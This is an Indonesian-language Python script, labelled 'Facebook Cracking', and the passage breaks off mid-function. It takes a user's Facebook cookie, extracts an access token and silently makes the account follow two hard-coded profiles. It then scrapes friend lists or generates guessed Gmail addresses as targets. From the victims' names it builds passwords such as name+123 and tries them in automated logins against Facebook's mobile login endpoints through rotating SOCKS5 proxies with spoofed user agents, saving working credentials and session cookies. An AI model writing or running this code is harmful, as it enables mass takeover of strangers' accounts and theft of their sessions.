try:
    import re, os, sys, bs4, time, json, base64, rich
    import requests, random, datetime
    import platform, fake_useragent
    from concurrent.futures import ThreadPoolExecutor as Read
    from bs4 import BeautifulSoup as parser
    from datetime import datetime
    from time import sleep
    from time import time as mark
    from rich.panel import Panel
    from rich.tree import Tree
    from rich import print as prints
    from rich.console import Console
    from rich.table import Table
    from rich.columns import Columns
    from rich.markdown import Markdown
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
except (ModuleNotFoundError, ImportError) as e:
    os.system('clear') ; sys.exit(f' \33[m[\x1b[1;91mError Module\33[m] {str(e).title()}\n \33[m[\x1b[1;91mError Module\33[m] Module \x1b[1;91m{str(e.name)} \33[mBelum Terinstall\n \33[m[\x1b[1;91mError Module\33[m] Silahkan install dengan ketik <=> pip install \x1b[1;92m{str(e.name)}')

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' #ORANGE
N = '\x1b[0m' # DEFAULT  

dump, dump2, news = [], [], []

class REQ:
   
   def __init__(self):
       self.ses = requests.Session()
       self.url = "https://github.com/AdityaTwinz"
       self.OS_mkdir()
   
   def OS_mkdir(self):
       try:os.mkdir('DataLog') ; os.mkdir('Results')
       except:pass

   def clearTerminal(self, platform):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")
   
   def get_Proxy(self, proxy = []):
       if os.path.isfile('DataLog/socks5.txt') is True:
          return(open('DataLog/socks5.txt','r').read().splitlines())
       else:
          try:
             response = self.ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all')
             for xc in response.text.splitlines():
                 if xc.isdigit:
                   if xc not in proxy:
                      proxy.append(xc)
                      open('DataLog/socks5.txt','a').write(f'{xc}\n')
             return proxy
          except requests.exceptions.ConnectionError as e:
             sleep(3.2) ; self.get_Proxy()
   
   def UserAgent(self):
       self.rr = random.randint
       self.rc = random.choice
       self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(6)))
       # Generate UserAgent
       self.ua1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(65, 99))}.0.{str(self.rr(3100, 3900))}.{str(self.rr(75, 99))} Mobile Safari/537.36,gzip(gfe)"
       self.ua2 = f"Mozilla/5.0 (Linux; Android {str(self.rr(7, 12))}; RMX3360 Build/RKQ1.{str(self.rr(200000, 299999))}.001; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(75, 99))}.0.{str(self.rr(3500, 3999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 Puffin/9.0.0.{str(self.rr(10000, 90000))}AP"
       self.ua3 = f"Mozilla/5.0 (Linux; Android {str(self.rr(7, 12))}; STG S30 Build/PPR1.{str(self.rr(111111, 199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(75, 99))}.0.{str(self.rr(4100, 4999))}.{str(self.rr(70, 99))} Mobile Safari/537.36 UCBrowser/{str(self.rr(7, 20))}.5.2.{str(self.rr(1000, 1999))} (UCMini) Mobile"
       base = self.rc([self.ua1, self.ua2, self.ua3])
       return base
       
   def UserAgent_API(self):
       self.rr = random.randint
       self.rc = random.choice
       self.android = f"{str(self.rr(9, 13))}"
       self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(7)))
       self.build2 = f"{str(self.rr(70, 99))}-{str(self.rr(20, 59))}-{str(self.rr(0, 29))}-{str(self.rr(0, 9))}"
       self.chrome = f"{str(self.rr(75, 199))}"
       userAgentku = ("Dalvik/2.1.0 (Linux; U; Android {}; moto g52 Build/{}.{}) AppleWebKit [PB/165] (KHTML, like Gecko) Chrome/{}.0.0.0 Mobile Safari/537.36".format(self.android, self.build, self.build2, self.chrome))
       return userAgentku
       
   def UserAgent_APP(self):
       self.rr = random.randint
       self.rc = random.choice
       self.build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(6)))
       self.build2 = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(8)))
       self.app1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/{self.build1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(55, 99))}.0.{str(self.rr(2500, 2999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/{str(self.rr(75, 150))}.0.0.21.71;]"
       self.app2 = f"Mozilla/5.0 (Linux; arm; Android {str(self.rr(7, 12))}; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(75, 199))}.0.0.0 YaBrowser/{str(self.rr(20, 99))}.9.5.83.00 SA/3 Mobile Safari/537.36"
       self.app3 = f"Mozilla/5.0 (Linux; Android 4.0.{str(self.rr(3, 4))}; Alpha GT Build/{str(self.rc(['IML74K', 'IMM76D']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(30, 45))}.0.{str(self.rr(1500, 2500))}.{str(self.rr(90, 150))} Mobile Safari/537.36"
       self.app4 = f"Mozilla/5.0 (Linux; U; Android 4.2.2; ja-jp; N-06E Build/{self.build2}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
       App_get = self.rc([self.app1, self.app2, self.app3, self.app4])
       return App_get
              
   def Logooo(self):
       Console().print(Markdown(f"## Facebook Cracking. @AdityaExec_"),style='bold yellow')
       Console().print(f' {M2}● {K2}● {H2}●')
       Console().print(f'''    {H2}    ,*-~"`^"*u_                                _u*. "^`"~-*,
     p!^       /  jPw                            w9j \        ^!p
   w^.._      /      "\_                      _/"     \        _.^w
        *_   /          \_      _    _      _/         \     _* 
          q /           / \q   ( `--` )   p/ \          \   p
          jj5****._    /    ^\_) {M2}o  {M2}o{H2} (_/^    \    _.****6jj
                   *_ /      "==) {P2};;{H2} (=="      \ _*
                    `/.w***,   /(    )\   ,***w.\"
                     ^ ilmk ^c/ )    ( \c^      ^
                             'V')_)(_('V'
                                 `` ``''')
       
   def DEL_Cok(self):
       try:
           os.system("rm -rf DataLog/cookies.txt")
           os.system("rm -rf DataLog/tokenEaab.txt")
       except:pass

   def REQ_Cookie(self):
       self.clearTerminal(platform) ; self.Logooo()
       Console().print(Markdown(f"## Masukan cookie Facebook anda, pastikan anda menggunakan akun tumbal"),style='white')
       Cooks = Console().input(f'\n>_ @AdityaExec_ : ')
       try:
           askTrue = self.ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {'cookie':Cooks})
           search = re.search('act=(.*?)&nav_source',str(askTrue.content)).group(1)
           askReq = self.ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={search}&nav_source=no_referrer',cookies = {'cookie':Cooks})
           dashToken = re.search('accessToken="(.*?)"',str(askReq.content)).group(1)
           open('DataLog/cookies.txt','w').write(Cooks)
           open('DataLog/tokenEaab.txt','w').write(dashToken)
           self.Followers(Cooks) ; self.Followers2(Cooks)
           Console().print(Markdown("##### Login token EAAB berhasil:"),style='white')
           Console().print(f'{H2}{dashToken}') ; sleep(3.1)
           Console().print(Markdown(f"## Silahkan jalankan ulang scirptnya"),style='blue') ; sleep(3.1) ; sys.exit()
       except requests.exceptions.ConnectionError as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()
       except Exception as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; self.REQ_Cookie()
   
   def Followers(self, cok):
       try:
           req = parser(self.ses.get('https://m.facebook.com/100073125893802', cookies = {'cookie':cok}).text,'html.parser')
           for x in req.find_all('a', href=True):
               if '/a/subscribe.php?' in str(x.get('href')):
                 r = self.ses.get('https://m.facebook.com%s'%(x['href']), cookies = {'cookie':cok}).text
       except:pass
   
   def Followers2(self, cok):
       try:
           req = parser(self.ses.get('https://m.facebook.com/100093124212331', cookies = {'cookie':cok}).text,'html.parser')
           for x in req.find_all('a', href=True):
               if '/a/subscribe.php?' in str(x.get('href')):
                 r = self.ses.get('https://m.facebook.com%s'%(x['href']), cookies = {'cookie':cok}).text
       except:pass

   def Menuuu(self):
       self.clearTerminal(platform) ; self.Logooo()
       try:
           coks = open('DataLog/cookies.txt','r').read()
           toks = open('DataLog/tokenEaab.txt','r').read()
       except FileNotFoundError as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; self.REQ_Cookie()
       try:
           url = self.ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={toks}", cookies = {"cookie": coks}).json()
           nama, id = url['name'], url['id']
       except (KeyError, NameError) as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; self.DEL_Cok() ; self.REQ_Cookie()
       except requests.exceptions.ConnectionError as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()
       Console().print(Markdown(f"##### {nama} | {id}"),style='white')
       Console().print(f'\n{H2}01{P2}. Crack id dari publik\n{H2}02{P2}. Crack id dari publik massal\n{H2}03{P2}. Crack id dari email\n{H2}04{P2}. Crack id dari file\n{H2}05{P2}. Check hasil OK/CP\n{M2}00{P2}. Log-out ( Cookie )')
       ykhh = Console().input(f'\n>_ @AdityaExec_ : ')
       
       if ykhh =='1' or ykhh =='01':
         Console().print(Markdown(f"## Masukan id target, pastikan id yang anda masukan publik"),style='blue')
         uid = Console().input(f'\n>_ @AdityaExec_ : ')
         data = {'access_token':toks, 'after':None}
         url = 'https://graph.facebook.com/v18.0/%s/friends'
         Console().print(Markdown(f"## Sedang dump id {uid}"),style='yellow') ; print('\r') ; sleep(3.3)
         for xxx in uid.split(','):
             Dump().Publik(data, url, xxx, dump, coks)
         print('')
         Furthermore().Methodee()
       
       elif ykhh =='2' or ykhh =='02':
           Console().print(Markdown(f"## Masukan id target, banyaknya id pisahkan dengan "," ( koma )"),style='thistle1')
           uid = Console().input(f'\n>_ @AdityaExec_ : ')
           for uuid in uid:
                try:
                    with requests.Session() as r:
                        Dump().Massal(int(uuid), coks, unit_cursor = '')
                except KeyboardInterrupt:pass
                except Exception as e:pass
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='3' or ykhh =='03':
           try:
                 Console().print(Markdown(f"## Masukan nama target, example : aditya, dinda, julie"),style='thistle1')
                 nama = Console().input(f'\n>_ @AdityaExec_ : ')
                 Console().print(Markdown(f"## Masukan total dump atau clone anda"),style='thistle1')
                 total = Console().input(f'\n>_ @AdityaExec_ : ')
                 print('')
                 Dump().Dump_Email(nama, total)
           except Exception as e:
                 Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='4' or ykhh =='04':
           try:
                Console().print(Markdown(f"## Masukan tempat file anda, example: /sdcard/dump.txt"),style='thistle1')
                Files = Console().input(f'\n>_ @AdityaExec_ : ')
                print('')    
                Dump().Dump_File(Files)   
           except Exception as e:
                Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='5' or ykhh =='05':
           Console().print(f'\n{H2}01{P2}. Check hasil OK\n{H2}02{P2}. Check hasil CP\n{H2}03{P2}. Kembali ke menu')
           aa = Console().input(f'\n>_ @AdityaExec_ : ')
           
           if aa =='1' or aa =='01':
             try:
                 yyy = open("Results/ok.txt", "r").readlines()
             except FileNotFoundError as e:
                 Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
             for i in yyy:
                 tree = Tree(f"\r",guide_style="bold grey100")
                 tree.add(f'{H2}{i}')
                 prints(tree)
             Console().print(Markdown(f"## Check hasil ok selesai"),style='green') ; sleep(3) ; sys.exit()
           
           elif aa =='2' or aa =='02':
               try:
                   yyy = open("Results/cp.txt", "r").readlines()
               except FileNotFoundError as e:
                   Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
               for i in yyy:
                   tree = Tree(f"\r",guide_style="bold grey100")
                   tree.add(f'{K2}{i}')
                   prints(tree)
               Console().print(Markdown(f"## Check hasil cp selesai"),style='yellow') ; sleep(3) ; sys.exit()
           
           elif aa =='3' or aa =='03':
               self.Menuuu()
           
           else:Console().print(Markdown(f"## Input dengan benar"),style='yellow') ; sleep(3) ; self.Menuuu()
       
       elif ykhh =='0' or ykhh =='00':
           self.DEL_Cok() ; Console().print(Markdown(f"## Berhasil menghapus cookie & token"),style='yellow') ; sleep(3) ; sys.exit()
         

class Dump:
   
   def __init__(self):
      self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
      pass
   
   def Publik(self, params, host, user, array, coki):
       try:
           req = requests.get(host%(user), params = params, cookies = {'cookie':coki}).json()
           for xyz in req['data']:
               uid = '%s|%s'%(xyz['id'],xyz['name'])
               if uid not in array:array.append(uid)
               Console().print(f'>_ @AdityaExec_ -: {B2}{len(array)}{P2}',end='\r')
           if 'paging' in str(req):
              after = req['paging']['cursors']['after']
              params.update({'after': after})
              self.Publik(params, host, user, array, coki)
       except:pass
       return array
   
   def Massal(self, uuid, cok, unit_cursor):     
        try:
            with requests.Session() as r:
                r.headers.update({
                    'Host': 'mbasic.facebook.com',
                    'Upgrade-Insecure-Requests': '1',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'User-Agent': self.ua,
                    'Accept-Language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cok
                })
                response = r.get('https://mbasic.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(uuid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(dump):
                            continue
                        else:
                            dump.append(f'{self.id_friends}|{self.name}')
                            Console().print(f'>_ @AdityaExec_ -: {K2}{len(dump)}{P2}',end='\r')
                if 'Sorry, something went wrong.' in str(response):
                    return False
                elif 'unit_cursor=' in str(response):
                    self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                    self.Dump_Masal(uuid, cok, self.unit_cursor)
                else:
                    return False
        except KeyboardInterrupt as e:
            Console().print(Markdown(f"## {str(e).title()}"),style='red')
            return False
   
   def Dump_Email(self, nama, total):
        dpn = [
           "azizah","asep","agus","supri","bayu","yuli","ria","aditya","inayah","bambang",
           "jupri","julia","nico","bima","bisma","ayulia","ayu","sri","rinto","udin","rehan",
           "semarang","palembang","lampung","cirebon","brebes","jakarta","bogor",
           "bandung","sukabumi","garut","banten","bukittinggi","padang","minang",
           "sugeng","nabila","bila","ara","chan","prabowo","jokowi","ganjar","wisnu",
        ]
        blk = [
         "123","1234","12345","123456","1234567","098","0987","321","3214",
         "official","gaming","fans","yahho","subur","jaya","cantik","cosplay"
        ]
        try:
            for xyc in range(int(total)):
                Acak = ([
                    f'{str(random.choice(dpn))}',
                    f'{str(random.randint(0,90))}',
                    f'{str(random.choice(dpn))}',
                    f'{str(random.choice(blk))}{str(random.randint(0,90))}',
                    f'{xyc}',
                    f'{str(random.choice(blk))}{str(random.randint(0,90))}',
                    f'{str(random.choice(dpn))}{str(random.choice(blk))}'
                ])
                data = nama+str(random.choice(Acak))+'@gmail.com'
                if data in dump:pass
                else:
                    self.id = nama
                    self.nama = data 
                    dump.append(data+'|'+nama)
                    Console().print(f'>_ @AdityaExec_ -: {H2}{len(dump)}.{len(data)}{P2}',end='\r')
        except (KeyboardInterrupt, Exception) as e:
            Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()
   
   def Dump_File(self, Files):
        try:
            Ambil = open(Files,'r').readlines()
            for data in Ambil:
                try:
                    user, nama = data.split('|')
                    dump.append(data)
                except Exception as e:
                    Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit() 
                Console().print(f'>_ @AdityaExec_ -: {H2}{len(dump)}{P2}',end='\r')
        except FileNotFoundError as e:
            Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()

class Furthermore:
   
   def __init__(self):
       self.live, self.check, self.loop = [], [], 0
       self.Method, self.Paslist, self.Passku = [], [], []
       self.dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
       self.tgl = datetime.now().day
       self.bln = self.dic[(str(datetime.now().month))]
       self.thn = datetime.now().year
   
   def Methodee(self):
       Console().print(Markdown(f"## Total {len(dump)} id terkumpul"),style='blue')
       Console().print(f'\n{B2}01{P2}. Methode async ( {H2}m.facebook.com {P2})\n{B2}02{P2}. Methode validate ( {H2}mbasic.facebook.com {P2})\n{B2}03{P2}. Methode Reguler ( {H2}free.facebook.com {P2})\n{B2}04{P2}. Methode asyncAPP ( {H2}tiktok.com{P2} )\n{B2}05{P2}. Methode validateAPP ( {H2}instagram.com{P2} )\n{B2}06{P2}. Methode regulerAPP ( {H2}instagram.com{P2} )')
       Asw = Console().input(f'\n>_ @AdityaExec_ : ')
       if Asw =='1' or Asw =='01':
         self.Method.append('async')
       elif Asw =='2' or Asw =='02':
           self.Method.append('validate')
       elif Asw =='3' or Asw =='03':
           self.Method.append('regular')
       elif Asw =='4' or Asw =='04':
           self.Method.append('asyncc2')
       elif Asw =='5' or Asw =='05':
           self.Method.append('validatee22')
       elif Asw =='6' or Asw =='06':
           self.Method.append('regularr2')
       else:
           self.Method.append('async')
       self.Wordlist()
   
   def Wordlist(self):
        Console().print(Markdown(f"## Ingin menambahkan sandi manual? (Y/t)"),style='red')
        ask = Console().input(f'\n>_ @AdityaExec_ : ')
        if ask =='y' or ask =='Y' or ask =='Ya' or ask =='ya' or ask =='YA':
          self.Paslist.append('ya')
          Console().print(Markdown(f"## Buat kata sandi anda, gunakan ',' (koma) sebagai pemisah"),style='yellow')
          pwdia = Console().input(f'\n>_ @AdityaExec_ : ')
          asky = pwdia.split(',')
          for x in asky:
              self.Passku.append(x)
        else:self.Paslist.append('no')
        self.Generate_id()
   
   def Generate_id(self):
       Console().print(Markdown(f"## Setting userId anda"),style='yellow')
       Console().print(f'\n{K2}01{P2}. Generate Id old\n{K2}02{P2}. Generate id new\n{K2}03{P2}. Generate id random')
       ykh = Console().input(f'\n>_ @AdityaExec_ : ')
       
       if ykh =='1' or ykh =='01':
         for old in sorted(dump):
             dump2.append(old)
       
       elif ykh =='2' or ykh =='02':
           for new in sorted(dump):
               news.append(new)
           setid = len(news)
           setid2 = (setid-1)
           for xc in range(setid):
               dump2.append(news[setid2])
               setid2 -=1
       
       elif ykh =='3' or ykh =='03':
           for rand in dump:
               generateID_rand = random.randint(0,len(dump2))
               dump2.insert(generateID_rand, rand)
       self.Generate_List()
   
   def Generate_List(self):
        global prog,des
        Console().print(Markdown(f"## Start {self.tgl}-{self.bln}-{self.thn} OK/CP"),style='green') ; print('')
        prog = Progress(TextColumn("{task.description}"))
        des = prog.add_task('',total=len(dump))
        with prog:
            with Read(max_workers=30) as Itil:
                for akun in dump:
                    user, nama = akun.split('|')[0], akun.split('|')[1].lower()
                    depan = nama.split(' ')[0]
                    self.password = []
                    if len(nama)<6:
                        if len(depan)<3:
                            pass
                        else:
                            self.password.append(nama)
                            self.password.append(depan+'123')
                            self.password.append(depan+'1234')
                            self.password.append(depan+'12345')
                    else:
                        if len(depan)<3:
                            self.password.append(nama)
                        else:
                            self.password.append(nama)
                            self.password.append(depan+'123')
                            self.password.append(depan+'1234')
                            self.password.append(depan+'12345')
                    if 'ya' in self.Paslist:
                        for xc in self.Passku:
                            self.password.append(xc)
                    else:pass
                    if 'async' in self.Method:
                        Itil.submit(self.asyncAPI, user, self.password)
                    elif 'validate' in self.Method:
                        Itil.submit(self.validateAPI, user, self.password)
                    elif 'regular' in self.Method:
                        Itil.submit(self.regularAPI, user, self.password)
                    elif 'asyncc2' in self.Method:
                        Itil.submit(self.asyncAPP, user, self.password)
                    elif 'validatee22' in self.Method:
                        Itil.submit(self.validateAPP, user, self.password)
                    elif 'regularr2' in self.Method:
                        Itil.submit(self.regularAPP, user, self.password)
                    else:
                        Itil.submit(self.asyncAPI, user, self.password)
               
        if self.live == 0 and self.check == 0:
            Console().print(Markdown(f"## Opshh anda tidak mendapatkan hasil sama sekali"),style='yellow') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
        else:
            Console().print(f'\n>_ Selamat, Anda Mendapatkan Hasil OK {H2} {len(self.live)} {P2}Dan Hasil CP {K2}: {len(self.check)}') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
   
   def asyncAPI(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', headers = {'User-Agent':ua})
               data = {
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "prefill_contact_point":f"{user} {pw}",
                 "prefill_source":"browser_dropdown",
                 "prefill_type":"password",
                 "first_prefill_source":"browser_dropdown",
                 "first_prefill_type":"contact_point",
                 "had_cp_prefilled":True,
                 "had_password_prefilled":True,
                 "is_smart_lock":False,
                 "bi_xrwh":0,
                 "bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                 "encpass":f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "m.facebook.com",
                  "content-length": "2168",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "user-agent": ua,
                  "viewport-width": "501",
                  "content-type": "application/x-www-form-urlencoded",
                  "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "x-asbd-id": "129477",
                  "dpr": "1.4375",
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-prefers-color-scheme": "light",
                  "sec-ch-ua-platform": '"Android"',
                  "accept": "*/*",
                  "origin": "https://m.facebook.com",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-dest": "empty",
                  "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"Email : {user}\nPass : {pw}\n Cookies : {kuki}\n UserAgent : {ua}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"Email : {user}\nPass : {pw}\nUserAgent : {ua}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def validateAPI(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent_API()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&wtsid=rdr_03thTOvDjPwW2IySg&refsrc=deprecated&_rdr')
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "uid":user,
                 "next":"https://mbasic.facebook.com/login/save-device/",
                 "flow":"login_no_pin",
                 "pass":pw
               }
               headers = {
                  "Host": "mbasic.facebook.com",
                  "content-length": "144",
                  "cache-control": "max-age=0",
                  "dpr": "1.4375",
                  "viewport-width": "980",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "sec-ch-ua-platform": '"Android"',
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-prefers-color-scheme": "light",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://mbasic.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&wtsid=rdr_03thTOvDjPwW2IySg&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data = data, headers = headers, proxies = proxis, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"Email : {user}\nPass : {pw}\n Cookies : {kuki}\n UserAgent : {ua}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"Email : {user}\nPass : {pw}\nUserAgent : {ua}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
